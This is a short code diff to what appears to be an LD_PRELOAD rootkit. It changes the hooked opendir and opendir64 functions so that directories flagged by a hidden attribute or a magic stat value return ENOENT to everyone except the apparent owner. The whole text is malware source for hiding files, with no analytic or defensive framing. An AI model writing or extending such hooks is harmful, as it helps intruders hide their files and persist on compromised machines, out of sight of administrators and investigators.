@@ -8,7 +8,7 @@ DIR *opendir(const char *name)
 
     if(owned()) return old_opendir(name);
 
-    if(hidden_xattr(name)) { errno = ENOENT; return NULL; }
+    if(hidden_xattr(name) || hidden_xstat(_STAT_VER, name, 32)) { errno = ENOENT; return NULL; }
 
     return old_opendir(name);
 }
@@ -23,11 +23,7 @@ DIR *opendir64(const char *name)
 
     if(owned()) return old_opendir64(name);
 
-    if(hidden_xattr(name) || hidden_xstat(_STAT_VER, name, 32))
-    {
-        errno = ENOENT;
-        return NULL;
-    }
+    if(hidden_xattr(name) || hidden_xstat(_STAT_VER, name, 32)) { errno = ENOENT; return NULL; }
 
     return old_opendir64(name);
 }
